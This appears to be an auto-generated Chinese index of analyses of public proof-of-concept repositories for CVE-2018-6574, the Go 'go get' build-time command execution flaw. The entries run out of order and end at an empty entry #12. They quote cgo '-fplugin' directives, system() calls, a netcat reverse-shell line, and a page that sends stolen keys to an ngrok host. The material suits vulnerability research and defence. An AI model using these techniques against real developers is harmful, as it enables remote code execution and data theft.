**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者需要使用存在漏洞的Go版本，并通过`go get`命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许在源代码构建期间执行远程命令。这是因为 Go 在处理 gcc 或 clang 插件功能时，未阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个包含恶意代码的 Go 包，该代码利用这些参数在构建时执行任意命令。提供的 POC 代码通过创建一个共享对象 (`attack.so`)，其中包含一个在加载时执行 `sleep 10` 命令的构造函数。`main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，在构建时加载该共享对象，从而触发恶意代码的执行。漏洞利用方式是诱使用户使用易受攻击的 Go 版本 `go get` 命令下载并构建包含恶意 `#cgo` 指令的包。由于POC代码明确定义了执行的命令和利用方式，没有发现隐藏的恶意代码，因此投毒风险评估为0%。

**项目地址:** [tjcim/cve-2018-6574](https://github.com/tjcim/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #33

**来源**: [CVE-2018-6574-yavolo_CVE-2018-6574.md](../2018/CVE-2018-6574-yavolo_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 用户使用受影响版本的Go执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 漏洞允许攻击者在用户使用 `go get` 命令下载和构建包含恶意代码的Go包时，执行任意命令。该漏洞是由于 Go 在构建过程中没有正确阻止 `-fplugin=` 和 `-plugin=` 参数传递给 gcc 或 clang 编译器造成的。攻击者可以创建一个包含恶意 C 代码的 Go 包，并利用 `// #cgo CFLAGS:` 指令将恶意代码编译成共享库，然后在构建过程中执行。 

**有效性：** 提供的PoC代码是有效的。其中 `a.c` 文件包含恶意C代码，该代码在编译成动态链接库 (`a.so`) 后，会被 `main.go` 文件中的 `// #cgo CFLAGS: -fplugin=./a.so` 指令加载并在构建过程中执行。`a.c` 中的代码 `system("/usr/local/bin/score 6c9d4862-4326-403c-a1c6-47a2ad6fcda5");` 会执行任意系统命令。

**投毒风险：** 此处 `a.c` 中执行 `system("/usr/local/bin/score 6c9d4862-4326-403c-a1c6-47a2ad6fcda5");` 可以视作 PoC的一部分，用于证明漏洞存在，但同时也存在一定的投毒风险。开发者可能隐藏其他恶意代码，例如窃取用户凭据或安装后门。由于`score`命令指向位置未知,可能存在更大的风险.

**利用方式：**

1.  **创建恶意Go包：** 攻击者创建一个包含 `a.c` 和 `main.go` 文件的恶意Go包。
2.  **植入恶意C代码：** 在 `a.c` 文件中编写要执行的恶意C代码。PoC中为执行特定的命令。
3.  **CGO指令：** 在 `main.go` 文件中使用 `// #cgo CFLAGS: -fplugin=./a.so` 指令，指示 Go 编译器在构建过程中加载并执行恶意共享库。
4.  **诱骗用户安装：** 攻击者将恶意Go包上传到公共代码仓库或通过其他方式诱骗用户使用 `go get` 命令下载和构建该包。
5.  **执行恶意代码：** 当用户使用 `go get` 命令构建恶意包时，恶意C代码将被编译成共享库并执行，从而导致远程命令执行。

**项目地址:** [yavolo/CVE-2018-6574](https://github.com/yavolo/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #34

**来源**: [CVE-2018-6574-zerbaliy3v_cve-2018-6574-exploit.md](../2018/CVE-2018-6574-zerbaliy3v_cve-2018-6574-exploit.md)

# CVE-2018-6574

> 📦 该CVE有 **34** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-6574-AshrSec_pentesterlab-CVE-2018-6574.md](../2018/CVE-2018-6574-AshrSec_pentesterlab-CVE-2018-6574.md)

## CVE-2018-6574-Go远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统需要安装受影响版本的Go，并且执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574漏洞存在于Go语言的`go get`命令中，允许远程命令执行。当使用`go get`构建包含恶意代码的Go项目时，攻击者可以利用gcc或clang插件功能，通过`-fplugin=`或`-plugin=`参数执行任意命令。提供的PoC代码包含一个C文件（`exploit.c`）和一个Go文件（`main.go`）。

`exploit.c` 文件定义了一个在加载时自动执行的 `malicious` 函数。这个函数调用 `system` 函数执行 `/usr/local/bin/score 2c03d8c2-7038-402d-ae28-03a4d2ed9f42` 命令。这个命令是用于上报漏洞利用成功的信息，是测试环境常用的方法。所以这里的投毒风险很低。

`main.go` 文件通过 cgo 技术，允许 Go 代码调用 C 代码。 `#cgo CFLAGS: -fplugin=./exploit.so`  这行代码指示编译器将 `exploit.so` 作为 gcc/clang 插件加载，从而执行 `exploit.c` 中的恶意代码。

利用方式如下：
1.  攻击者创建一个包含恶意 `exploit.c` 和 `main.go` 的Go项目。
2.  攻击者将该项目托管到公共代码仓库。
3.  受害者在安装了受影响Go版本的机器上使用 `go get <攻击者项目>` 命令。
4.  `go get` 在构建项目时，会加载 `exploit.so` 插件，从而执行 `exploit.c` 中的恶意代码。

结论：该PoC代码有效，可以用于验证CVE-2018-6574漏洞。代码本身没有明显的隐藏投毒代码的迹象。

**项目地址:** [AshrSec/pentesterlab-CVE-2018-6574](https://github.com/AshrSec/pentesterlab-CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #2

**来源**: [CVE-2018-6574-Cypheer_exploit_CVE-2018-6574.md](../2018/CVE-2018-6574-Cypheer_exploit_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的go版本执行`go get`命令获取恶意模块

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许通过 `go get` 命令执行远程命令。攻击者可以通过在恶意Go模块中，利用 gcc 或 clang 的 plugin 特性，在构建时执行任意代码。`main.go` 包含 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，这会指示 go 编译器加载并执行 `exploit.so` 作为插件。如果该`.so`文件包含恶意代码，它将在构建过程中被执行。提供的`CORS.html`文件尝试利用CORS漏洞从`http://api-ptl-fbafd824-4fabf863.libcurl.so/api/v1/keys`获取敏感信息，然后将信息发送到攻击者的服务器`https://09ef-186-141-133-245.sa.ngrok.io`。这种组合表明漏洞利用可能涉及到引诱用户下载包含恶意`exploit.so`文件的Go模块，并在构建时执行恶意代码，同时利用CORS漏洞窃取其他域的数据。

**有效性：** `main.go`中的`-fplugin`标志结合`exploit.so`的潜在恶意性，使得该漏洞利用具有有效性。`CORS.html` 的存在表明攻击者可能试图结合利用其他漏洞。

**投毒风险：** 投毒风险为10%。虽然主要的攻击向量看起来是利用`go get`的远程代码执行漏洞，`CORS.html`的存在提出了可能的其他恶意目的。`CORS.html`本身不直接与go编译器或`-fplugin`漏洞相关，因此将其视为完全独立的投毒行为是合理的。 然而，如果恶意作者试图通过其他途径使用该POC，那么使用CORS代码有风险。`main.go`中的核心漏洞利用机制更直接且易于理解。

**利用方式：**

1.  **创建恶意的Go模块：** 攻击者创建一个包含恶意 `exploit.so` 文件的Go模块，该文件将在编译时执行恶意代码。
2.  **利用 `-fplugin` 标志：** 在Go代码中使用 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，指示编译器加载恶意插件。
3.  **诱导受害者 `go get`：** 攻击者诱骗受害者使用 `go get` 命令获取该恶意模块。
4.  **代码执行：** 当受害者构建恶意模块时，`exploit.so` 中的代码将被执行。
5. **结合CORS攻击 (可选):** CORS.html 是可选的攻击辅助，旨在获取其他域的敏感数据。但这需要目标API存在CORS配置错误。
综上，该漏洞的利用方式是结合了`go get`的远程代码执行漏洞和潜在的CORS漏洞，旨在实现远程代码执行和数据窃取。

**项目地址:** [Cypheer/exploit_CVE-2018-6574](https://github.com/Cypheer/exploit_CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #3

**来源**: [CVE-2018-6574-Dannners_CVE-2018-6574-go-get-RCE.md](../2018/CVE-2018-6574-Dannners_CVE-2018-6574-go-get-RCE.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 目标系统使用存在漏洞的Go版本，且使用`go get`命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-6574漏洞允许攻击者在受害者构建源代码时执行任意命令。漏洞根源在于`go get`命令没有正确过滤`-fplugin`和`-plugin`参数，导致可以加载恶意的gcc或clang插件。攻击者可以通过创建一个包含恶意插件的Go包，并诱使受害者使用`go get`命令获取该包来触发漏洞。

**有效性：**
根据提供的漏洞信息和搜索引擎结果，该漏洞确实存在，并且有公开的PoC。

**投毒风险：**
提供的PoC代码本身只是一个简单的示例，用于证明漏洞的存在。它通过CGO调用`printf`函数打印一段文字。代码中使用了`-fplugin=./plugin.so`，这意味着需要同时存在一个名为`plugin.so`的恶意插件才能实现远程命令执行。虽然提供的代码本身不包含恶意行为，但是如果攻击者创建一个包含更复杂恶意逻辑的`plugin.so`，则可能造成严重危害。因此，存在一定的投毒风险。

对仓库投毒风险评估：此代码本身无明显风险，风险点在于配套的plugin.so文件，如果plugin.so存在恶意代码，则存在远程代码执行的风险，因为plugin.so不在代码中，需要依赖外部提供，作者可以在plugin.so加入任意代码，风险最高，因此投毒风险为5%。

**利用方式：**
1.  攻击者创建一个包含恶意gcc或clang插件（`plugin.so`）的Go包。
2.  该插件会在编译时执行攻击者预设的命令。
3.  攻击者将该恶意Go包托管在公开的代码仓库（例如GitHub）或私有服务器上。
4.  攻击者诱使受害者使用`go get`命令获取该恶意Go包。
5.  当受害者构建该Go包时，恶意插件会被加载并执行，从而实现远程命令执行。

根据 pentesterlab 网站的描述，通过托管恶意包诱导用户安装是主要的利用方式。

**项目地址:** [Dannners/CVE-2018-6574-go-get-RCE](https://github.com/Dannners/CVE-2018-6574-go-get-RCE)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #4

**来源**: [CVE-2018-6574-NsByte_CVE-2018-6574.md](../2018/CVE-2018-6574-NsByte_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的Go版本，并且执行了 `go get` 命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令在目标系统上执行任意代码。此漏洞源于 Go 在构建源代码期间没有充分阻止 `gcc` 或 `clang` 插件的 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个包含恶意 `attack.c` 文件和相应的 `main.go` 文件的 Go 包。`attack.c` 文件包含一个 `malicious()` 函数，该函数使用 `__attribute__((constructor))` 标记，使其在共享库加载时自动执行。在这个 POC 中，`malicious()` 函数尝试建立一个反向shell (`nc blablabla`)。`main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令，指示 Go 编译器在构建过程中加载 `attack.so` 共享库。当用户使用易受攻击的 Go 版本执行 `go get` 命令获取此恶意包时，`attack.so` 会被加载，并且 `malicious()` 函数会被执行，从而导致远程命令执行。

**有效性:** 提供的 POC 代码有效，它展示了如何通过 `go get` 和 `gcc` 插件在目标系统上执行任意命令。`attack.c` 文件中的 `system("nc blablabla")` 会尝试建立反向 shell，从而验证了远程代码执行的可能性。

**投毒风险:** 此代码仓库中没有明显的投毒代码。`attack.c` 中执行反向 shell 的代码是漏洞利用的核心部分，而不是隐藏的恶意行为。该利用方式的意图明确，且目的在于利用CVE-2018-6574。

**利用方式:** 攻击者需要创建一个包含恶意 `attack.c` 和 `main.go` 文件的 Go 包，并将其托管在可公开访问的存储库中。然后，诱使目标用户使用易受攻击的 Go 版本执行 `go get` 命令来获取此恶意包。当 `go get` 执行时，Go 编译器会加载 `attack.so` 共享库，并执行其中的恶意代码，从而导致远程命令执行。攻击者可以通过修改 `attack.c` 文件中的命令来执行任意操作，例如安装后门、窃取数据或控制整个系统。

**项目地址:** [NsByte/CVE-2018-6574](https://github.com/NsByte/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #5

**来源**: [CVE-2018-6574-Saboor-Hakimi_CVE-2018-6574.md](../2018/CVE-2018-6574-Saboor-Hakimi_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 受害者使用存在漏洞的Go版本执行 `go get` 命令拉取恶意代码

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过构造包含恶意 `// #cgo CFLAGS: -fplugin=` 指令的 Go 代码，在受害者使用 `go get` 命令拉取并构建该代码时，利用 gcc 或 clang 插件功能执行任意命令。

**有效性：**
提供的 PoC 代码是有效的。`attack.c` 文件包含一个在程序加载时执行 `system()` 函数的恶意函数，该函数会执行 `/usr/local/bin/score a96ec182-5326-4191-9570-5d5c3fe248a8` 命令。`main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器在构建过程中加载 `attack.so` 插件，从而触发恶意代码的执行。

**投毒风险：**
经过分析，此 PoC 本身并不包含隐藏的投毒代码。`/usr/local/bin/score` 命令的功能未知，但如果该路径指向攻击者控制的服务器，可以构成数据回传或者其他恶意行为。不过单从提供的代码来看，其目的仅仅是利用漏洞触发执行任意命令，而非在代码中植入后门或其他形式的恶意代码。因此，投毒风险评估为 0%。

**利用方式：**
1.  攻击者创建一个包含恶意 `// #cgo CFLAGS: -fplugin=` 指令的 Go 包，并将该包托管在公开的代码仓库中。
2.  受害者使用存在漏洞的 Go 版本执行 `go get` 命令拉取该恶意包。
3.  `go get` 命令会自动构建该包，此时 Go 编译器会加载攻击者指定的恶意插件。
4.  恶意插件中的代码被执行，导致攻击者可以在受害者机器上执行任意命令。

**项目地址:** [Saboor-Hakimi/CVE-2018-6574](https://github.com/Saboor-Hakimi/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #6

**来源**: [CVE-2018-6574-YoussefSalama1_CVE-2018-6574.md](../2018/CVE-2018-6574-YoussefSalama1_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 受害者需要使用存在漏洞的Go版本执行 `go get` 命令获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Go语言的`go get`命令中，由于在编译过程中没有正确过滤`-fplugin`和`-plugin`参数，导致攻击者可以通过构造包含恶意插件的Go代码仓库，诱使受害者使用存在漏洞的Go版本执行`go get`命令时，执行任意命令。

**有效性分析：**
提供的POC代码展示了如何使用`// #cgo CFLAGS: -fplugin=./attack.so`指令指定一个插件。当使用存在漏洞的Go版本编译该代码时，`attack.so`会被加载，其中的代码会被执行，从而实现远程代码执行。

**投毒风险分析：**
提供的POC代码本身不包含明显的投毒代码，它的目的是演示漏洞利用。`attack.so`的具体内容需要进一步分析才能确定是否存在恶意代码。根据目前的信息，POC代码的投毒风险评估为0%。`main.go`本身的功能是调用`attack.so`中的函数，并打印返回值。 如果`attack.so`存在后门,执行远程命令,则存在高危风险,但此部分分析应当基于其他辅助文件,本分析只针对`main.go`进行。

**利用方式分析：**
1.  攻击者创建一个包含恶意C代码插件（如`attack.so`）的Go代码仓库。
2.  攻击者在Go源代码中使用`// #cgo CFLAGS: -fplugin=./attack.so`指令指定该插件。
3.  攻击者诱使受害者使用存在漏洞的Go版本执行`go get <attacker's repository>`命令。
4.  当Go编译受害者的代码时，会加载并执行`attack.so`中的恶意代码，从而实现远程命令执行。

**项目地址:** [YoussefSalama1/CVE-2018-6574](https://github.com/YoussefSalama1/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #7

**来源**: [CVE-2018-6574-adendarys_CVE-2018-6574.md](../2018/CVE-2018-6574-adendarys_CVE-2018-6574.md)

## CVE-2018-6574-Go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 需要目标系统使用受影响的Go版本，并执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于 `go get` 命令中，由于未正确过滤 gcc/clang 的 `-fplugin` 和 `-plugin` 参数，攻击者可以通过构造恶意的 Go 包，在构建过程中执行任意命令。提供的POC代码包含一个 C 文件 (`attack.c`)，该文件编译后生成一个动态链接库 (`attack.so`)，其中包含一个 `malicious()` 函数，该函数在动态链接库加载时自动执行，从而执行系统命令 `/usr/local/bin/score 504b8416-d89e-4980-80ff-7cd7d4605752`。Go 代码 (`main.go`) 使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令在编译时加载该动态链接库，从而触发恶意代码的执行。此POC有效，不存在明显的投毒代码，只是利用该漏洞执行预期的恶意行为。

**利用方式：**

1.  攻击者创建一个包含恶意 C 代码（如 `attack.c`）和 Go 代码（如 `main.go`）的 Go 包。
2.  `attack.c` 编译生成一个包含恶意指令的动态库。恶意指令可以是任意系统命令。
3.  Go 代码使用 `#cgo CFLAGS: -fplugin=./attack.so` 引入包含恶意指令的动态库。
4.  攻击者将该 Go 包发布到公共或私有仓库。
5.  受害者使用 `go get` 命令获取该 Go 包。
6.  在构建过程中，Go 编译器会执行 C 编译指令，加载恶意动态链接库，从而执行攻击者预设的恶意命令，导致远程命令执行。

**项目地址:** [adendarys/CVE-2018-6574](https://github.com/adendarys/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #8

**来源**: [CVE-2018-6574-antunesmpedro_CVE-2018-6574.md](../2018/CVE-2018-6574-antunesmpedro_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程命令执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 使用受影响的 Go 版本执行 `go get` 命令获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过特制的 Go 代码仓库在目标系统上执行任意命令。当用户使用 `go get` 命令获取包含恶意代码的仓库时，Go 构建系统会执行仓库中嵌入的恶意指令。

**有效性：**

提供的 POC 代码是有效的。`exploit.c` 文件包含一个名为 `malicious` 的函数，该函数使用 `system` 函数执行一个命令，在本例中是调用 `/usr/local/bin/score e105a311-4ea5-435a-89a8-770f2cdd2189`。 `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，该指令指示 go 编译器将 `exploit.so` 编译为插件，并在程序运行时加载它。因为受影响的 Go 版本没有正确阻止 `-fplugin` 和 `-plugin` 参数，所以这允许执行 `exploit.c` 中的恶意代码。

**投毒风险：**

提供的代码片段本身没有明显的投毒行为。`exploit.c` 执行的命令 `/usr/local/bin/score e105a311-4ea5-435a-89a8-770f2cdd2189`  可能用于完成漏洞利用挑战或者其他目的。该命令不是一个常见的恶意行为，因此不应将其判定为投毒。
整个代码仓库的投毒风险评估为 0%，因为提供的代码段没有任何恶意行为，并且没有迹象表明作者试图隐藏恶意代码。

**利用方式：**

1.  攻击者创建一个包含恶意 `exploit.c` 和 `main.go` 文件的 Go 代码仓库。
2.  `exploit.c` 文件包含需要在目标系统上执行的恶意代码。
3.  `main.go` 文件包含 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，从而利用漏洞。
4.  攻击者诱骗目标用户使用 `go get` 命令获取恶意仓库。
5.  当用户执行 `go get` 命令时，Go 构建系统会编译并加载 `exploit.so` 插件，从而执行 `exploit.c` 中的恶意代码。
6. 目标系统受到攻击，攻击者可以在目标系统上执行任意命令。

**项目地址:** [antunesmpedro/CVE-2018-6574](https://github.com/antunesmpedro/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #9

**来源**: [CVE-2018-6574-bme2003_CVE-2018-6574.md](../2018/CVE-2018-6574-bme2003_CVE-2018-6574.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 目标系统使用存在漏洞的Go版本，且执行了`go get`命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令执行任意代码。漏洞原因是 Go 在构建源代码时，没有正确阻止 `-fplugin=` 和 `-plugin=` 参数，攻击者可以利用 gcc 或 clang 的插件功能执行恶意代码。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意代码的 Go 包，其中包含一个 `attack.c` 文件和一个 `main.go` 文件。
2.  `attack.c` 文件包含一个 `malicious()` 函数，该函数使用 `system()` 函数执行任意命令。在给定的POC中，执行的命令是`/usr/local/bin/score a10c7b12-8910-4f65-8cd4-a6e57d90686b`。  这个命令很可能是用于提交漏洞利用结果的评分系统。
3.  `main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器将 `attack.c` 编译为共享库 `attack.so`，并将其作为插件加载。
4.  当用户使用 `go get` 命令获取该恶意包时，Go 编译器会自动编译并加载插件，从而执行 `malicious()` 函数中的恶意代码。

**有效性：**

提供的POC代码有效。`main.go`文件中的`// #cgo CFLAGS: -fplugin=./attack.so`指示了利用方式，即通过`go get`拉取代码时，会编译并加载`attack.so`，从而执行预设的恶意代码。

**投毒风险：**

分析POC代码后，没有发现明显的投毒代码。`attack.c` 中的 `system()` 函数执行的命令是明确的，该POC没有包含其他隐藏的恶意行为。因此，投毒风险评估为0%。虽然执行了恶意命令，但这属于漏洞验证所需的操作，不应被视为投毒。


**项目地址:** [bme2003/CVE-2018-6574](https://github.com/bme2003/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #10

**来源**: [CVE-2018-6574-chr1sM_CVE-2018-6574.md](../2018/CVE-2018-6574-chr1sM_CVE-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，允许远程命令执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 使用受影响的Go版本，且执行`go get`命令获取恶意代码仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574漏洞允许攻击者在`go get`命令执行过程中进行远程命令执行。漏洞原理是由于受影响的Go版本未正确过滤`-fplugin`和`-plugin`参数，攻击者可以构造包含恶意插件的Go项目，当用户使用`go get`获取并构建该项目时，恶意插件会被执行，从而实现远程命令执行。

**有效性评估：**
提供的PoC代码由两部分组成：`attack.c`和`golan.go`。`attack.c`包含一个`malicious()`函数，该函数使用`__attribute__((constructor))`修饰，表明该函数会在程序加载时自动执行。该函数的功能是执行`/usr/local/bin/score 3b9e2681-04f3-4771-b576-05baa2a7523f`命令。`golan.go` 是一个简单的 Go 程序，它调用 C 代码。通过组合这两个文件，攻击者可以创建一个恶意的 Go 包，当用户使用易受攻击的 `go get` 版本获取该包时，`attack.c` 中的恶意代码将被编译并执行，从而导致命令执行。

**投毒风险评估：**
提供的代码片段中，`attack.c` 执行了一个特定的命令`/usr/local/bin/score 3b9e2681-04f3-4771-b576-05baa2a7523f`，可以判定为漏洞验证代码，目的是为了验证漏洞是否存在。此命令本身可能与漏洞作者相关，但它不属于隐藏的、未公开的恶意行为，可以认为不存在投毒。因此投毒风险为0%。

**利用方式：**
1.  攻击者创建一个恶意的Go项目，其中包含`attack.c`和`golan.go`文件。
2.  `attack.c`包含恶意代码，例如执行任意命令。
3.  在Go项目的构建过程中，通过`-fplugin`或`-plugin`参数指定`attack.c`编译生成的插件。
4.  攻击者将恶意Go项目托管在公开的代码仓库中。
5.  诱导用户使用受影响的Go版本执行`go get`命令获取该恶意Go项目。
6.  当`go get`构建项目时，恶意插件会被加载并执行，从而实现远程命令执行。

**项目地址:** [chr1sM/CVE-2018-6574](https://github.com/chr1sM/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #11

**来源**: [CVE-2018-6574-currently-unkwn_CVE-2018-6574.md](../2018/CVE-2018-6574-currently-unkwn_CVE-2018-6574.md)

## CVE-2018-6574-Golang go get RCE

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Golang

**危害等级:** 高危，允许攻击者在受害者机器上执行任意命令

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 目标使用受影响的Golang版本，并且尝试使用`go get`命令获取包含恶意C代码的项目。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-6574漏洞允许攻击者通过`go get`命令执行远程代码。该漏洞源于Go语言在构建过程中未正确过滤`-fplugin`和`-plugin`参数，导致可以加载恶意的GCC/Clang插件。攻击者可以构造包含恶意C代码的Go项目，当受害者使用`go get`命令获取该项目时，恶意代码会被编译并执行。

**有效性：**

提供的POC代码有效。`main.go`文件通过`// #cgo CFLAGS: -fplugin=./attack.so`指令指定了要加载的插件`attack.so`。`attack.so`文件（未提供，但推测是恶意payload）会被编译并加载，从而执行恶意代码。

**投毒风险：**

代码仓库中可能存在投毒代码的风险，但从给出的`main.go`和`README.md`内容来看，直接的投毒证据并不明显。`main.go`本身只是加载一个插件，恶意代码应该位于`attack.so`中，而这个文件并没有提供。 投毒风险评估为20%是因为攻击者可以将恶意 payload 隐藏在编译后的 `attack.so` 里, 用户下载后编译并不会感知恶意代码的存在, 存在一定风险。

**利用方式：**

1.  攻击者创建一个包含恶意C代码（编译为`.so`文件）的Go项目。
2.  Go项目的源码中，使用`// #cgo CFLAGS: -fplugin=./attack.so`指令指定要加载的恶意插件。
3.  攻击者将该项目托管在公共代码仓库（如GitHub）上。
4.  受害者使用`go get <attacker_repo>`命令尝试获取该项目。
5.  Go在构建项目时，会加载攻击者指定的恶意插件，从而在受害者机器上执行任意代码。
6.  防御措施包括升级到不受影响的Go版本，或配置Go工具链以禁止加载第三方插件。

**项目地址:** [currently-unkwn/CVE-2018-6574](https://github.com/currently-unkwn/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #12

**来源**: [CVE-2018-6574-elw0od_PentesterLab.md](../2018/CVE-2018-6574-elw0od_PentesterLab.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标机器使用受影响的Go版本，并尝试使用`go get`获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

